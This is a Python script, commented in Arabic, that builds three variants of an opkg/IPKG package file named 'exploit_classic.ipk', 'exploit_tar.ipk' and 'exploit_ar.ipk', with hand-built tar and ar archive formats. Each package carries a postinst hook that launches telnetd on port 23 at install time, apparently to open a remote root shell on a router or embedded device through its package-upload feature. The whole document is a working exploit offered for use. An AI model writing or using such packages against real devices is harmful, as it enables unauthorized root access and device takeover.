import tarfile
import io

# 1. تجهيز النصوص البرمجية الداخلية
control_data = (
    "Package: network-unlock\n"
    "Version: 1.0\n"
    "Architecture: all\n"
    "Maintainer: root\n"
    "Description: Enable telnet\n"
)

postinst_data = (
    "#!/bin/sh\n"
    "telnetd -p 23 &\n"
    "exit 0\n"
)

# 2. بناء أرشيف control.tar.gz الداخلي بدقة
control_stream = io.BytesIO()
with tarfile.open(fileobj=control_stream, mode='w:gz') as tar:
    c_bytes = control_data.encode('utf-8')
    t_info = tarfile.TarInfo(name='control')
    t_info.size = len(c_bytes)
    tar.addfile(t_info, io.BytesIO(c_bytes))
    
    p_bytes = postinst_data.encode('utf-8')
    t_info = tarfile.TarInfo(name='postinst')
    t_info.size = len(p_bytes)
    t_info.mode = 0o755  # إعطاء صلاحية التنفيذ للسكربت
    tar.addfile(t_info, io.BytesIO(p_bytes))

control_tar_gz = control_stream.getvalue()

# 3. بناء أرشيف data.tar.gz الداخلي (فارغ)
data_stream = io.BytesIO()
with tarfile.open(fileobj=data_stream, mode='w:gz') as tar:
    pass
data_tar_gz = data_stream.getvalue()

# --- الصيغة الأولى: Classic IPKG (tar.gz خارجي بدون ملفات إضافية) ---
with tarfile.open('exploit_classic.ipk', mode='w:gz') as ipk:
    for name, data in [('control.tar.gz', control_tar_gz), ('data.tar.gz', data_tar_gz)]:
        t_info = tarfile.TarInfo(name=name)
        t_info.size = len(data)
        ipk.addfile(t_info, io.BytesIO(data))

# --- الصيغة الثانية: Plain Tar Outer (أرشيف tar خارجي غير مضغوط) ---
with tarfile.open('exploit_tar.ipk', mode='w') as ipk:
    for name, data in [('control.tar.gz', control_tar_gz), ('data.tar.gz', data_tar_gz)]:
        t_info = tarfile.TarInfo(name=name)
        t_info.size = len(data)
        ipk.addfile(t_info, io.BytesIO(data))

# --- الصيغة الثالثة: Standard Unix AR Archive (بناء هيكلية ar يدوياً عبر الـ Bytes) ---
def create_ar_archive(filename, files_dict):
    with open(filename, 'wb') as f:
        f.write(b"!<arch>\n")
        for name, data in files_dict.items():
            header = f"{name:<16}{'0':<12}{'0':<6}{'0':<6}{'100644':<8}{len(data):<10}`\n"
            f.write(header.encode('ascii'))
            f.write(data)
            if len(data) % 2 != 0:
                f.write(b"\n")

create_ar_archive('exploit_ar.ipk', {
    'debian-binary': b"2.0\n",
    'control.tar.gz': control_tar_gz,
    'data.tar.gz': data_tar_gz
})

print("Successfully generated: exploit_classic.ipk, exploit_tar.ipk, exploit_ar.ipk")